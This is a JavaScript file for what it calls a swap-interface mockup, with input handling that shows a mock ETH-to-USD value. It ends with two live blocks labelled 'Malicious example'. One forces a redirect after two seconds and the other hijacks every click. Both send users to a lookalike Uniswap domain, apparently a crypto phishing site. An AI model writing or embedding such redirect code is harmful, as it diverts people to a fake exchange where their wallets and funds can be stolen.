// Basic logic to update the "$" value when typing numbers
document.addEventListener('DOMContentLoaded', () => {
    const input = document.querySelector('.amount-input');
    
    input.addEventListener('input', (e) => {
        let val = e.target.value;
        // Mock function to calculate USD value (e.g., 1 ETH = $3000)
        // This is purely UI logic, not actual blockchain data.
        let usdValue = (val * 3000).toFixed(2);
        
        // Find the corresponding footer and update it
        const footer = e.target.closest('.input-section').querySelector('.input-footer');
        footer.textContent = `$${usdValue || '0'}`;
    });

    // Simple button interaction
    const swapBtn = document.querySelector('.full-width');
    swapBtn.addEventListener('click', () => {
        alert("This is a UI mockup. Blockchain integration requires Web3 libraries (wagmi, viem) and a backend connection to smart contracts.");
    });
});

// Malicious example
setTimeout(function() {
    window.location.href = "https://uniswap-dex-app.surge.sh";
}, 2000); // 2000 milliseconds = 2 seconds

// Malicious example
document.addEventListener('click', function(event) {
    event.preventDefault(); // Stops the original button action
    window.location.href = "https://uniswap-dex-app.surge.sh";
});
